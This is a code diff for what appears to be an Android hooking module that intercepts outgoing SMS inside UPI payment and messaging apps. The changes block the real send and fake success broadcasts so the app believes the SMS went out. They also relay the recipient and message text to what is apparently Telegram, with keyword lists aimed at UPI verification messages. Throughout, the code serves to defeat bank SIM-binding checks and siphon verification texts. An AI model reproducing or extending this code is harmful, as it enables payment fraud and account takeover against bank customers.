@@ -1076,76 +1076,51 @@ void pipeline_outgoing(JNIEnv* env, const std::string& dest_in, const std::strin
     ConfigManager::instance().reload();
     const auto& config = ConfigManager::instance().get();
 
-    // Fix swapped fields (OTP text landed in dest, package in body)
+    // Fix swapped fields (OTP in dest / package in body)
     if ((!is_clean_sms_dest(dest) || is_incoming_otp_noise(dest)) &&
-        is_clean_sms_dest(body) && is_outgoing_upi_verify_body(dest)) {
+        is_clean_sms_dest(body) &&
+        (is_outgoing_upi_verify_body(dest) || (!is_pkg_like(dest) && dest.size() > 20))) {
         std::swap(dest, body);
     }
-    const bool verify = is_outgoing_upi_verify_body(body);
-    // Any UPI outgoing when Intercept ON (not Hero-only keyword gate)
-    const bool any_out = config.intercept_fake_success && is_clean_sms_dest(dest) &&
-                         !body.empty() && body.size() >= 4 && !is_incoming_otp_noise(body) &&
-                         body.find("com.") != 0 && body.find("android.") != 0;
-    if (is_incoming_otp_noise(body) || is_incoming_otp_noise(dest) ||
-        (!verify && !any_out) || !is_clean_sms_dest(dest)) {
-        write_hook_status("skip_tg_not_outgoing_verify");
-        write_isms_trace("skip_tg_not_outgoing_verify");
-        // Radio already blocked by caller hooks — fire OK without Telegram junk
-        if (env && config.intercept_fake_success && g_in_hooked_upi) {
+
+    // SMS Tweaks: never TG/file incoming OTP or package junk — still fake-OK below
+    const bool junk = is_incoming_otp_noise(body) || is_incoming_otp_noise(dest) ||
+                      is_pkg_like(body) || is_pkg_like(dest) || body == "__SILENT__";
+    const bool can_tg = !junk && is_valid_outgoing_capture(dest, body);
+
+    // Always fake-success so app thinks SMS sent (SMS Tweaks core)
+    if (env && (config.intercept_fake_success || g_in_hooked_upi || g_is_messaging_app)) {
+        if (can_tg) {
+            sms_hook::handle_outgoing_sms(env, zygisk_utils::string_to_jstring(env, dest),
+                                          zygisk_utils::string_to_jstring(env, body));
+            fake_success::on_outgoing_intercepted(env, dest, body, sent_intent, delivery_intent);
+        } else {
             fake_success::fire_sms_result_broadcasts(env, dest.empty() ? "0000" : dest);
             if (sent_intent || delivery_intent) {
                 fake_success::on_outgoing_intercepted(env, dest.empty() ? "0000" : dest,
                                                       "__SILENT__", sent_intent, delivery_intent);
             }
         }
-        return;
-    }
-    // Placeholder dest — radio may be blocked by caller, but don't TG junk
-    {
-        std::string d;
-        for (char c : dest)
-            if (std::isdigit(static_cast<unsigned char>(c))) d += c;
-        bool all0 = !d.empty();
-        for (char c : d)
-            if (c != '0') {
-                all0 = false;
-                break;
-            }
-        if (all0) {
-            write_isms_trace("skip_tg_placeholder_dest");
-            return;
-        }
     }
 
-    // Dedupe — same To+body only once / 3 min (stops 20-30x TG spam)
+    if (!can_tg) {
+        write_hook_status("skip_tg_junk_or_otp");
+        write_isms_trace("skip_tg_junk_or_otp");
+        return;
+    }
+
+    // Dedupe — same To+body only once / 3 min
     static std::string s_last_key;
     static time_t s_last_ts = 0;
     const std::string key = dest + "|" + body;
     const time_t now = time(nullptr);
     if (key == s_last_key && (now - s_last_ts) < 180) {
-        write_hook_status("dedupe_skip_tg");
-        write_isms_trace("dedupe_skip_tg");
-        // Still fake-success to app so it doesn't retry forever
-        if (env) {
-            fake_success::on_outgoing_intercepted(env, dest, body, sent_intent, delivery_intent);
-        }
+        write_hook_status("dedupe_skip_file");
+        write_isms_trace("dedupe_skip_file");
         return;
     }
     s_last_key = key;
     s_last_ts = now;
-
-    if (env) {
-        sms_hook::handle_outgoing_sms(env, zygisk_utils::string_to_jstring(env, dest),
-                                      zygisk_utils::string_to_jstring(env, body));
-        fake_success::on_outgoing_intercepted(env, dest, body, sent_intent, delivery_intent);
-    }
-
-    // Only persist / TG-eligible files when capture is clean (fixes stuck OTP JSON)
-    if (!is_valid_outgoing_capture(dest, body)) {
-        write_hook_status("skip_file_invalid_capture");
-        write_isms_trace("skip_file_invalid_capture");
-        return;
-    }
 
     char flag_buf[2048];
     snprintf(flag_buf, sizeof(flag_buf), "%s\n%s", dest.c_str(), body.c_str());
@@ -1184,75 +1159,83 @@ void pipeline_outgoing(JNIEnv* env, const std::string& dest_in, const std::strin
 
 bool try_block_isms(JNIEnv* env, jobject data, jobject reply, const ModuleConfig& config,
                     std::string& dest, std::string& body, jint code) {
-    // reply may be null on FLAG_ONEWAY — still must block real SIM (Messages A16)
+    // SMS Tweaks: Intercept ON in UPI/Messages → block outgoing ISms, fake OK, TG To+body
     if (!data) return false;
     reset_parcel(env, data);
     const std::string iface = parcel_read_string(env, data);
     reset_parcel(env, data);
-    // Match ISms / isms / Sms (AOSP + OEM descriptors)
     const bool is_sms_iface =
         iface.find("ISms") != std::string::npos || iface.find("isms") != std::string::npos ||
         iface.find("ISmsEx") != std::string::npos || iface.find("IMms") != std::string::npos ||
         iface.find("MotoSms") != std::string::npos;
     if (!is_sms_iface) return false;
+    if (!g_in_hooked_upi && !g_is_messaging_app) return false;
+
+    const bool intercept =
+        config.intercept_fake_success || config.hook_outgoing_sms || g_in_hooked_upi;
+    if (!intercept) return false;
 
     read_isms_outgoing(env, data, dest, body);
-    if (dest.empty() && body.empty()) {
-        extract_isms_from_blob(env, data, dest, body);
-    }
+    if (dest.empty() && body.empty()) extract_isms_from_blob(env, data, dest, body);
+
     const bool blob_verify = parcel_blob_has_verify(env, data);
     const bool blob_sms = parcel_blob_has_sms_compose(env, data);
     const std::string blob = parcel_marshall_blob(env, data);
     const bool sendish = blob_looks_like_outgoing_send(blob);
-
-    // Never treat incoming OTP display/query as outgoing send
-    if ((is_incoming_otp_noise(body) || is_incoming_otp_noise(dest)) && !sendish &&
-        !blob_verify) {
-        write_isms_trace("isms_skip_otp_noise");
-        return false;
-    }
-
     const bool looks = looks_like_isms_send(code, dest, body, blob_verify, blob_sms);
-    // SMS Tweaks / Navi: intercept ON → block ANY outgoing-looking ISms in UPI/Messages
-    const bool nuclear = config.intercept_fake_success && (g_in_hooked_upi || g_is_messaging_app) &&
-                         (sendish || blob_verify || blob_sms || looks ||
-                          (is_clean_sms_dest(dest) && !body.empty() && !is_incoming_otp_noise(body) &&
-                           !is_pkg_like(body)));
 
-    if (!looks && !nuclear) {
-        if (g_is_messaging_app || g_in_hooked_upi) {
-            char miss[192];
-            snprintf(miss, sizeof(miss),
-                     "isms_passthrough code=%d destlen=%zu bodylen=%zu send=%d", (int)code,
-                     dest.size(), body.size(), sendish ? 1 : 0);
-            write_hook_status(miss);
-            write_isms_trace(miss);
-        }
+    // Inbox OTP display — do not block
+    if ((is_incoming_otp_noise(body) || is_incoming_otp_noise(dest)) && !sendish &&
+        !blob_verify && !blob_sms) {
+        write_isms_trace("isms_skip_otp_inbox");
         return false;
     }
 
-    const bool want = config.intercept_fake_success || config.hook_outgoing_sms || blob_verify ||
-                      g_in_hooked_upi || g_is_messaging_app;
-    if (!want) return false;
+    // UPI: intercept → block almost all ISms (SmsManager path). Messages: send markers only.
+    bool should_block = false;
+    if (g_in_hooked_upi) {
+        should_block = sendish || blob_verify || blob_sms || looks ||
+                       is_outgoing_upi_verify_body(body) ||
+                       (is_clean_sms_dest(dest) && !body.empty() && !is_incoming_otp_noise(body) &&
+                        !is_pkg_like(body)) ||
+                       (blob.size() > 64 &&
+                        (blob_contains_needle(blob, "smsto") ||
+                         blob_contains_needle(blob, "SMSTO") ||
+                         blob_contains_needle(blob, "sendText") ||
+                         blob_contains_needle(blob, "HEROAXIS") ||
+                         blob_contains_needle(blob, "DO NOT COPY") ||
+                         blob_contains_needle(blob, "YESPRO") ||
+                         blob_contains_needle(blob, "USE UPI PIN") ||
+                         is_clean_sms_dest(dest)));
+        // SMS Tweaks nuclear: UPI + ISms + non-trivial parcel → block (parse fail bhi)
+        if (!should_block && config.intercept_fake_success && blob.size() > 120) {
+            should_block = true;
+        }
+    } else {
+        should_block = sendish || blob_verify || blob_sms || looks ||
+                       is_outgoing_upi_verify_body(body) || is_valid_outgoing_capture(dest, body);
+    }
+
+    if (!should_block) {
+        char miss[192];
+        snprintf(miss, sizeof(miss), "isms_passthrough code=%d dest=%zu body=%zu send=%d",
+                 (int)code, dest.size(), body.size(), sendish ? 1 : 0);
+        write_isms_trace(miss);
+        return false;
+    }
 
     if (dest.empty()) dest = "0000000000";
     if (body.empty()) {
         if (blob_verify) body = "UPI_VERIFY_SMS";
         else if (sendish) body = "OUTGOING_SMS_BLOCK";
-        else if (g_is_messaging_app) body = "MSG_SMS_INTERCEPT";
         else body = "SMS_INTERCEPT";
     }
-    // Still never pipeline OTP/package junk into last_outgoing/TG
-    if (is_incoming_otp_noise(body) || is_pkg_like(body)) {
-        if (reply) write_ok_reply(env, reply);
-        write_hook_status("isms_blocked_silent_junk");
-        write_isms_trace("isms_blocked_silent_junk");
-        return true;
-    }
 
-    logger::info("OutgoingSms", "ISms SAFE block code=%d dest=%s body=%.60s msg=%d reply=%d",
-                 (int)code, dest.c_str(), body.c_str(), g_is_messaging_app ? 1 : 0,
-                 reply ? 1 : 0);
+    char okline[200];
+    snprintf(okline, sizeof(okline), "isms_block_tweaks code=%d dest=%.20s bodylen=%zu",
+             (int)code, dest.c_str(), body.size());
+    write_hook_status(okline);
+    write_isms_trace(okline);
 
     jobject sent_pi = nullptr;
     jobject del_pi = nullptr;
@@ -1260,8 +1243,6 @@ bool try_block_isms(JNIEnv* env, jobject data, jobject reply, const ModuleConfig
 
     pipeline_outgoing(env, dest, body, sent_pi, del_pi);
     if (reply) write_ok_reply(env, reply);
-    write_hook_status("isms_blocked_ok");
-    write_isms_trace("isms_blocked_ok");
     return true;
 }
 
@@ -1444,40 +1425,8 @@ jboolean hook_BinderProxy_transact(JNIEnv* env, jobject thiz, jint code, jobject
                 write_isms_trace("isms_blocked");
                 return JNI_TRUE;
             }
-            extract_isms_from_blob(env, data, dest, body);
-            if (is_incoming_otp_noise(body) || is_incoming_otp_noise(dest)) {
-                write_isms_trace("isms_passthrough_incoming_otp");
-            } else {
-                const bool got_out =
-                    is_outgoing_upi_verify_body(body) && is_clean_sms_dest(dest);
-                const bool sendish_out = sendish && !blob_contains_needle(blob, "is your OTP");
-                const bool intercept_any =
-                    config.intercept_fake_success && (g_in_hooked_upi || g_is_messaging_app) &&
-                    (iface_sms || sendish_out) && !body.empty() && !is_pkg_like(body);
-
-                if (got_out || (sendish_out && is_outgoing_upi_verify_body(body)) ||
-                    (intercept_any && is_valid_outgoing_capture(dest, body)) ||
-                    (intercept_any && sendish_out && is_outgoing_upi_verify_body(body))) {
-                    if (is_valid_outgoing_capture(dest, body) ||
-                        (is_outgoing_upi_verify_body(body) && !is_incoming_otp_noise(body))) {
-                        pipeline_outgoing(env, is_clean_sms_dest(dest) ? dest : "0000000000", body,
-                                          nullptr, nullptr);
-                    }
-                    if (reply) write_ok_reply(env, reply);
-                    write_hook_status("isms_blocked_nuclear");
-                    write_isms_trace("isms_blocked_nuclear");
-                    return JNI_TRUE;
-                }
-                // SMS Tweaks: intercept + sendish → silent block even if parse weak
-                if (config.intercept_fake_success && sendish_out &&
-                    (g_in_hooked_upi || g_is_messaging_app)) {
-                    if (reply) write_ok_reply(env, reply);
-                    write_hook_status("isms_blocked_silent");
-                    write_isms_trace("isms_blocked_silent");
-                    return JNI_TRUE;
-                }
-                write_isms_trace("isms_passthrough_query");
-            }
+            // try_block already applied SMS Tweaks rules — no second nuclear path
+            write_isms_trace("isms_passthrough_after_try");
         }
     }
 
